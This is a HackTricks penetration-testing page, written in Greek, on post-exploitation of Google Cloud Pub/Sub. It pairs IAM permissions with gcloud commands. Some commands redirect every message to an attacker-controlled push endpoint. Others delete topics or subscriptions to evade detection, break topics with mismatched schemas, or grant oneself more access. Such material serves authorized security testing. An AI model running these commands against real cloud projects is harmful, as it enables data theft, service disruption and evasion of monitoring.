# GCP - Pub/Sub Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Pub/Sub

Για περισσότερες πληροφορίες σχετικά με το Pub/Sub δείτε την παρακάτω σελίδα:

{{#ref}}
../gcp-services/gcp-pub-sub.md
{{#endref}}

### `pubsub.topics.publish`

Δημοσίευση μηνύματος σε ένα topic, χρήσιμο για **αποστολή απροσδόκητων δεδομένων** και ενεργοποίηση απροσδόκητων λειτουργιών ή εκμετάλλευση ευπαθειών:

<details>

<summary>Δημοσίευση μηνύματος στο topic</summary>
```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"
```
</details>

### `pubsub.topics.detachSubscription`

Χρήσιμο για να εμποδίσετε μια συνδρομή να λαμβάνει μηνύματα — ίσως για να αποφύγετε τον εντοπισμό.

<details>

<summary>Αποσύνδεση συνδρομής από θέμα</summary>
```bash
gcloud pubsub topics detach-subscription <FULL SUBSCRIPTION NAME>
```
</details>

### `pubsub.topics.delete`

Χρήσιμο για να αποτρέψετε ένα subscription από το να λαμβάνει μηνύματα, ίσως για να αποφύγετε την ανίχνευση.\
Είναι δυνατό να διαγράψετε ένα topic ακόμη και με subscriptions συνδεδεμένα σε αυτό.

<details>

<summary>Delete topic</summary>
```bash
gcloud pubsub topics delete <TOPIC NAME>
```
</details>

### `pubsub.topics.update`

Χρησιμοποιήστε αυτήν την άδεια για να αλλάξετε κάποια ρύθμιση του topic ώστε να το διαταράξετε, όπως `--clear-schema-settings`, `--message-retention-duration`, `--message-storage-policy-allowed-regions`, `--schema`, `--schema-project`, `--topic-encryption-key`...

### `pubsub.topics.setIamPolicy`

Χορηγήστε στον εαυτό σας την άδεια να εκτελέσετε οποιαδήποτε από τις προηγούμενες επιθέσεις.

### **`pubsub.subscriptions.create,`**`pubsub.topics.attachSubscription` , (`pubsub.subscriptions.consume`)

Αποκτήστε όλα τα μηνύματα σε έναν web server:

<details>

<summary>Δημιουργήστε push subscription για να λαμβάνετε μηνύματα</summary>
```bash
# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint https://<URL to push to>
```
</details>

Δημιουργήστε μια subscription και χρησιμοποιήστε την για να **pull messages**:

<details>

<summary>Δημιουργία pull subscription και ανάκτηση μηνυμάτων</summary>
```bash
# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create <subscription name> --topic <topic_name>

# You also need pubsub.subscriptions.consume for this
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>
## This command will wait for a message to be posted
```
</details>

### `pubsub.subscriptions.delete`

**Διαγραφή μιας συνδρομής** μπορεί να είναι χρήσιμη για να διαταράξετε ένα σύστημα επεξεργασίας καταγραφών ή κάτι παρόμοιο:

<details>

<summary>Διαγραφή συνδρομής</summary>
```bash
gcloud pubsub subscriptions delete <FULL SUBSCRIPTION NAME>
```
</details>

### `pubsub.subscriptions.update`

Χρησιμοποιήστε αυτήν την άδεια για να ενημερώσετε κάποια ρύθμιση, ώστε τα μηνύματα να αποθηκεύονται σε ένα μέρος στο οποίο μπορείτε να έχετε πρόσβαση (URL, Big Query table, Bucket) ή απλώς για να το διαταράξετε.

<details>

<summary>Ενημέρωση endpoint συνδρομής</summary>
```bash
gcloud pubsub subscriptions update --push-endpoint <your URL> <subscription-name>
```
</details>

### `pubsub.subscriptions.setIamPolicy`

Δώστε στον εαυτό σας τα δικαιώματα που χρειάζονται για να εκτελέσετε οποιαδήποτε από τις προηγουμένως αναφερθείσες επιθέσεις.

### `pubsub.schemas.attach`, `pubsub.topics.update`,(`pubsub.schemas.create`)

Επισυνάψτε ένα schema σε ένα topic ώστε τα μηνύματα να μην το ικανοποιούν και επομένως το topic να διαταραχθεί.\
Εάν δεν υπάρχουν schemas, ίσως χρειαστεί να δημιουργήσετε ένα.

<details>

<summary>Δημιουργήστε αρχείο schema και επισυνάψτε το σε topic</summary>
```json:schema.json
{
"namespace": "com.example",
"type": "record",
"name": "Person",
"fields": [
{
"name": "name",
"type": "string"
},
{
"name": "age",
"type": "int"
}
]
}
```

```bash
# Attach new schema
gcloud pubsub topics update projects/<project-name>/topics/<topic-id> \
--schema=projects/<project-name>/schemas/<topic-id> \
--message-encoding=json
```
</details>

### `pubsub.schemas.delete`

Μπορεί να φαίνεται ότι με τη διαγραφή ενός schema θα μπορείτε να στέλνετε μηνύματα που δεν συμμορφώνονται με το schema. Ωστόσο, επειδή το schema θα διαγραφεί, κανένα μήνυμα δεν θα εισέλθει πραγματικά στο topic. Οπότε αυτό είναι **άχρηστο**:

<details>

<summary>Διαγραφή schema (όχι χρήσιμο)</summary>
```bash
gcloud pubsub schemas delete <SCHEMA NAME>
```
</details>

### `pubsub.schemas.setIamPolicy`

Χορήγησε στον εαυτό σου τα δικαιώματα που απαιτούνται για να εκτελέσεις οποιαδήποτε από τις προαναφερθείσες επιθέσεις.

### `pubsub.snapshots.create`, `pubsub.snapshots.seek`

Αυτό θα δημιουργήσει ένα snapshot όλων των unACKed μηνυμάτων και θα τα επιστρέψει στη subscription. Δεν είναι πολύ χρήσιμο για έναν επιτιθέμενο, αλλά ιδού:

<details>

<summary>Δημιούργησε snapshot και seek σε αυτό</summary>
```bash
gcloud pubsub snapshots create YOUR_SNAPSHOT_NAME \
--subscription=YOUR_SUBSCRIPTION_NAME
gcloud pubsub subscriptions seek YOUR_SUBSCRIPTION_NAME \
--snapshot=YOUR_SNAPSHOT_NAME
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
